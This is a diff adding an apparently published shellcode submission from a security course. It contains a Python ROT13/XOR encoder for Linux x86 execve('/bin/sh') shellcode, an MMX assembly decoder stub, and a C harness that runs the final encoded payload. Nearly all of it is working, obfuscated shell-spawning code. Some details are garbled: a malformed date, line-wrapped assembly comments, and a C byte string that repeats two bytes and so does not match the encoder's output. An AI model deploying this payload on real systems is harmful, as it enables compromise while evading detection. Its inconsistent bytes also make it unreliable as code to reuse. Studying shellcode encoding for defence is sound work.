@@ -1,0 +1,118 @@
+# Title: Linux/x86 - execve(/bin/sh) + MMX/ROT13/XOR Shellcode (Encoder/Decoder) (104 bytes)
+# Author: Kartik Durg
+# Date: 201-10-04
+# Shellcode Length: 104 BYTES
+# Student-ID: SLAE-1233
+# Write-up Link: https://iamroot.blog/2018/10/02/0x4-rot13_xor_encoder_mmx_decoder_shellcode-linux-x86/
+# Tested on: Ubuntu 16.0.4.1 (i686)
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+a). Python script for encoder
+-------------------------------------------------------------------------------------------------------------------------------------------------
+#!/usr/bin/python
+
+# ROT13 - XOR Encoder
+
+#original execve-stack
+shellcode =
+("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+
+rot = 13
+
+encoded = ""
+encoded2 = ""
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+#ROT-13
+shell_rot = (x + rot)%256
+
+# XOR Encoding
+xor_rot = shell_rot^0xAA
+encoded += '\\x'
+encoded += '%02x' %xor_rot
+
+encoded2 += '0x'
+encoded2 += '%02x,' %xor_rot
+
+print encoded
+
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
+-------------------------------------------------------------------------------------------------------------------------------------------------
+OUTPUT:
+-------------------------------------------------------------------------------------------------------------------------------------------------
+Encoded shellcode ...
+\x94\x67\xf7\xdf\x96\x96\x2a\xdf\xdf\x96\xc5\xdc\xd1\x3c\x5a\xf7\x3c\x45\xca\x3c\x44\x17\xb2\x70\x27
+0x94,0x67,0xf7,0xdf,0x96,0x96,0x2a,0xdf,0xdf,0x96,0xc5,0xdc,0xd1,0x3c,0x5a,0xf7,0x3c,0x45,0xca,0x3c,0x44,0x17,0xb2,0x70,0x27,
+Len: 25
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+b). Decoder for ROT13-XOR encoded shellcode using MMX instructions
+-------------------------------------------------------------------------------------------------------------------------------------------------
+global _start
+
+section .text
+_start:
+
+jmp short call_decoder
+
+decoder1:
+pop edi ;"edi" now points to "xor_value"
+lea esi, [edi +16] ;"esi" now points to "Shellcode"
+xor ecx, ecx
+mov cl, 4 ;Size of our shellcode is 25|"qword" operates 8bytes ata time
+hence 4*8=32|"loop" 4 times
+
+XOR_decode:
+movq mm0, qword [edi] ;move 8bytes of "xor_value" to mm0
+movq mm1, qword [esi] ;move 8bytes of "Shellcode" to mm1
+pxor mm0, mm1 ;Perform XOR operation
+movq qword [esi], mm0 ;overwrite the "Shellcode" with previous results
+add esi, 0x8 ;now "esi" points to next 8bytes of "Shellcode"
+loop XOR_decode ;loop 4 times
+
+decoder2:
+lea edi, [edi +8] ;"edi" now points to "rot_value"
+lea esi, [edi +8] ;"esi" now points to "Shellcode"|"Shellcode" contains
+previous XOR'ed results
+xor ecx, ecx
+mov cl, 4 ;"loop" 4 times
+
+ROT_decode:
+movq mm2, qword [edi] ;move 8bytes of "rot_value" to mm2
+movq mm3, qword [esi] ;move 8bytes of "Shellcode" to mm3
+psubb mm3, mm2 ;Subtract 13 from "Shellcode"
+movq qword [esi], mm3 ;overwrite the "Shellcode" with previous results
+add esi, 0x8 ;now "esi" points to next 8bytes of "Shellcode"
+loop ROT_decode ;"loop" 4 times
+jmp short Shellcode ;Execute decoded shellcode
+
+call_decoder:
+
+call decoder1
+xor_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
+rot_value: db 13, 13, 13, 13, 13, 13, 13, 13
+Shellcode: db
+0x94,0x67,0xf7,0xdf,0x96,0x96,0x2a,0xdf,0xdf,0x96,0xc5,0xdc,0xd1,0x3c,0x5a,0xf7,0x3c,0x45,0xca,0x3c,0x44,0x17,0xb2,0x70,0x27
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+c). Shellcode.c
+-------------------------------------------------------------------------------------------------------------------------------------------------
+#include<stdio.h>
+#include<string.h>
+
+unsigned char shellcode[] = \
+"\xeb\x36\x5f\x8d\x77\x10\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\x8d\x7f\x08\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x17\x0f\x6f\x1e\x0f\xf8\xda\x0f\x7f\x1e\x83\xc6\x08\xe2\xef\xeb\x15\xe8\xc5\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x94\x67\x94\x67\xf7\xdf\x96\x96\x2a\xdf\xdf\x96\xc5\xdc\xd1\x3c\x5a\xf7\x3c\x45\xca\x3c\x44\x17\xb2\x70\x27";
+
+main()
+{
+printf("Shellcode Length: %d\n", strlen(shellcode));
+int (*ret)() = (int(*)())shellcode;
+ret();
+}
+-------------------------------------------------------------------------------------------------------------------------------------------------
